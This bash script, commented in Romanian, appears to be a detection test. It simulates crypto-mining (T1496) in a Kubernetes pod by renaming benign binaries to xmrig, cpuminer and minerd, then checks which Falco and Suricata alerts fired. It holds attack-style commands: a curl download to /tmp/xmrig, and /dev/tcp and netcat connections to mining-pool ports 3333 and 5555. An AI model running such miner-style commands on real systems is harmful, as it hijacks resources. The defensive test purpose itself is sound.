#!/bin/bash
# Scenariul 2 - Crypto Mining / Resource Hijacking (T1496)
# NU rulam un miner real. Folosim binare benigne (/bin/sleep, /bin/true) redenumite ca
# xmrig/cpuminer/minerd ca sa declansam regula pe proc.name, + conexiuni la porturi de
# mining pool. Demonstreaza detectia fara consum de resurse / fara descarcare de malware.

set -e

POD=attack-pod
NS=attack-target
source "$(dirname "$0")/../_env.sh"

# Tinta pentru "mining pool" - IP public; niciun listen real pe porturile astea,
# dar syscall-ul connect() se logheaza oricum cu fd.rport setat.
# (Folosim acelasi IP public pentru ambele - evitam 10.152.183.1 care e svc-ul K8s API
# si ar declansa zgomot irelevant 'Contact K8S API Server From Container'.)
POOL_IP=1.1.1.1
CLUSTER_IP=1.1.1.1

echo "=================================================="
echo "Scenariul 2 - Crypto Mining"
echo "Start: $(date +%T)"
echo "=================================================="

START_TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
echo "[marker] Start UTC: $START_TS"
echo ""

# ---------------------------------------------------------------------------
# step 1/5 - "Descarca" un miner (curl) + il face executabil [T1105 + T1496 setup]
# ---------------------------------------------------------------------------
echo "[step 1/5] curl -o /tmp/xmrig <url> && chmod +x /tmp/xmrig (continut benign)"
kubectl exec -n $NS $POD -- bash -c "curl -s -m 8 -o /tmp/xmrig http://example.com/ 2>&1; cp /bin/sleep /tmp/xmrig; chmod +x /tmp/xmrig; ls -l /tmp/xmrig"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 2/5 - Executa "miner-ul" xmrig (de fapt /bin/sleep) [T1496]
# ---------------------------------------------------------------------------
echo "[step 2/5] /tmp/xmrig 3  (proc.name=xmrig declanseaza Crypto Mining Binary Detected)"
kubectl exec -n $NS $POD -- bash -c "/tmp/xmrig 3 & sleep 1; echo 'xmrig running pid='\$!"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 3/5 - Conexiune la port de mining pool 3333 via /dev/tcp [T1496 - pool checkin]
# ---------------------------------------------------------------------------
echo "[step 3/5] bash exec /dev/tcp/$POOL_IP/3333  (Crypto Mining Pool Connection)"
kubectl exec -n $NS $POD -- bash -c "timeout 3 bash -c 'exec 3<>/dev/tcp/$POOL_IP/3333 && echo connected-3333' 2>&1 || echo 'connect 3333 attempted'"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 4/5 - Conexiune la port de mining pool 5555 via netcat [T1496]
# ---------------------------------------------------------------------------
echo "[step 4/5] nc -w 2 $CLUSTER_IP 5555  (Crypto Mining Pool Connection + Network Scanning Tool)"
kubectl exec -n $NS $POD -- bash -c "timeout 3 nc -w 2 $CLUSTER_IP 5555 2>&1 | head -1 || echo 'connect 5555 attempted'"
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 5/5 - A doua varianta de miner: cpuminer + minerd [T1496]
# ---------------------------------------------------------------------------
echo "[step 5/5] cp /bin/true /tmp/cpuminer; cp /bin/sleep /tmp/minerd; chmod +x; exec ambele"
kubectl exec -n $NS $POD -- bash -c "cp /bin/true /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer; cp /bin/sleep /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd 2 & sleep 1; echo 'cpuminer + minerd executed'"
echo ""

# cleanup binare
kubectl exec -n $NS $POD -- bash -c "rm -f /tmp/xmrig /tmp/cpuminer /tmp/minerd /tmp/payload" 2>/dev/null || true

echo "=================================================="
echo "Atac terminat. Astept 40s pentru propagare ES..."
echo "=================================================="
sleep 40

echo ""
echo "=== Reguli FALCO declansate de la $START_TS ==="
curl -s "$ES/security-*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"aggs\":{\"by_rule\":{\"terms\":{\"field\":\"rule.name\",\"size\":20}},\"by_priority\":{\"terms\":{\"field\":\"log.level\",\"size\":10}}}}" \
  | python3 -m json.tool | sed -n '/aggregations/,$p'

echo ""
echo "=== Alertele SURICATA declansate ==="
curl -s "$ES/security-*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"suricata\"}},{\"term\":{\"event_type.keyword\":\"alert\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"aggs\":{\"by_signature\":{\"terms\":{\"field\":\"rule.name\",\"size\":20}}}}" \
  | python3 -m json.tool | sed -n '/aggregations/,$p'

echo ""
echo "=== Sample 12 detectii Falco (cronologic) ==="
curl -s "$ES/security-*/_search?size=12" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"sort\":[{\"@timestamp\":\"asc\"}],\"_source\":[\"@timestamp\",\"rule.name\",\"log.level\",\"output\"]}" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for h in d.get('hits',{}).get('hits',[]):
    s = h['_source']
    print(f\"  {s.get('@timestamp','?')[:19]} [{s.get('log',{}).get('level','?'):8}] {s.get('rule',{}).get('name','?')}\")
    out = s.get('output','')
    if out:
        print(f\"    -> {out[:200]}\")
"

echo ""
echo -n "Total Falco events: "
curl -s "$ES/security-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}}}"
echo ""

echo ""
echo "End: $(date +%T)"
